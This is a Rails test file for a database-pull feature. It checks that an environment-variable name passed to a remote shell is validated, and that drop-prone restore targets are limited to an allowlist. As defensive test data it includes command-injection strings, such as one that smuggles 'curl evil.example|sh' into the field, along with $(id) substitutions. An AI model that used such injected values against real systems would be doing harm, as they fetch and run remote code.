require "test_helper"

# SB-001. `source_database_url_var` is interpolated into a REMOTE shell command,
# and `restore_target` names a database that gets DROPPED. Both were validated
# only for presence.
class DatabasePullSafetyTest < ActiveSupport::TestCase
  setup do
    @org = Organization.create!(name: "Acme")
    @server = @org.servers.create!(name: "box", status: "online", ip_address: "10.0.0.1")
    @pull = DatabasePull.new(server: @server, organization: @org, status: "pending",
                             source_database_url_var: "DATABASE_URL")
  end

  # --- the env var reaches a remote shell -------------------------------

  test "an ordinary environment variable name is accepted" do
    %w[DATABASE_URL APP_DB_URL X1].each do |name|
      @pull.source_database_url_var = name
      assert @pull.valid?, "#{name}: #{@pull.errors.full_messages.to_sentence}"
    end
  end

  test "anything that is not an env var name is refused" do
    [
      'DATABASE_URL"; curl evil.example|sh; #',
      "DATABASE_URL$(id)",
      "DATABASE_URL`id`",
      "lowercase",
      "1LEADING_DIGIT",
      "WITH-DASH",
      "WITH SPACE"
    ].each do |hostile|
      @pull.source_database_url_var = hostile
      assert_not @pull.valid?, "#{hostile.inspect} must be refused"
    end
  end

  # --- the restore target gets DROPPED ----------------------------------

  test "Conductor's own databases can never be restore targets" do
    own = DatabasePull.conductor_own_databases
    skip "no configured databases to assert on" if own.empty?

    assert_not_includes DatabasePull.allowed_restore_targets, own.first,
                        "dropping the control plane's own database must be impossible"
  end

  test "postgres and the templates can never be restore targets" do
    with_targets("postgres,template0,template1,safe_db") do
      assert_equal [ "safe_db" ], DatabasePull.allowed_restore_targets
    end
  end

  test "a target outside the configured allowlist is refused" do
    with_targets("safe_db") do
      @pull.restore_target = "some_other_db"
      assert_not @pull.valid?
      assert_match(/not an allowed restore target/, @pull.errors[:restore_target].to_s)

      @pull.restore_target = "safe_db"
      assert @pull.valid?, @pull.errors.full_messages.to_sentence
    end
  end

  test "a blank target is fine — it means download only" do
    @pull.restore_target = nil
    assert @pull.valid?
  end

  # --- the gates that a bypassed validation cannot escape ---------------

  test "the remote dump command refuses a hostile var written by raw SQL" do
    @pull.save!(validate: false)
    @pull.update_column(:source_database_url_var, 'X"; curl evil.example|sh; #')

    service = DatabasePullService.new(@pull.reload)
    error = assert_raises(ArgumentError) { service.send(:remote_dump_command, "/tmp/x.dump") }
    assert_match(/not an environment variable name/, error.message)
  end

  test "the restore refuses a target written by raw SQL" do
    @pull.save!(validate: false)
    @pull.update_column(:restore_target, "postgres")

    service = DatabasePullService.new(@pull.reload)
    error = assert_raises(ArgumentError) { service.send(:restore_local, "/tmp/x.dump") }
    assert_match(/not an allowed restore target/, error.message)
  end

  private

  def with_targets(list)
    original = ENV["DATABASE_PULL_RESTORE_TARGETS"]
    ENV["DATABASE_PULL_RESTORE_TARGETS"] = list
    yield
  ensure
    ENV["DATABASE_PULL_RESTORE_TARGETS"] = original
  end
end
